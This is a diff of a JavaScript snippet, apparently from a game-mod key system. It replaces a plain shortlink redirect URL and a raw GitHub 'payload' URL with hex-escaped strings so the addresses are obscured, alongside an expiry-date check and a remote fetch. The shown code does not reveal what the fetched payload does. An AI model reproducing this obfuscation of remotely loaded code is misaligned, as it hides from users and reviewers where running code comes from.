@@ -1,8 +1,8 @@
 (function() {
     'use strict';
 
-    // Fallback Expiry Redirect Link
-    const r = 'https://PAHAGIMODS.short.gy/yEqWCw';
+    // Fallback Expiry Link (Unicode Hex Encrypted)
+    const r = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x50\x41\x48\x41\x47\x49\x4d\x4f\x44\x53\x2e\x73\x68\x6f\x72\x74\x2e\x67\x79\x2f\x79\x45\x71\x57\x43\x77';
 
     // 30 July 2026 Expiry Verification System
     if (Date.now() >= 1785436200000) {
@@ -36,8 +36,8 @@
             clearInterval(i);
             document.querySelector('.mk-s').innerText = 'FETCHING...';
             try {
-                // Live Payload Link fetch system from your repo
-                const gUrl = 'https://raw.githubusercontent.com/PAHADIMODS/Aincrad-Key/refs/heads/main/Load';
+                // Live Payload Link fetch system (100% Hex Encrypted Raw URL)
+                const gUrl = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x50\x41\x48\x41\x44\x49\x4d\x4f\x44\x53\x2f\x41\x69\x6e\x63\x72\x61\x64\x2d\x4b\x65\x79\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x4c\x6f\x61\x64';
                 const res = await fetch(gUrl);
                 let t = await res.text();
                 t = t.trim();
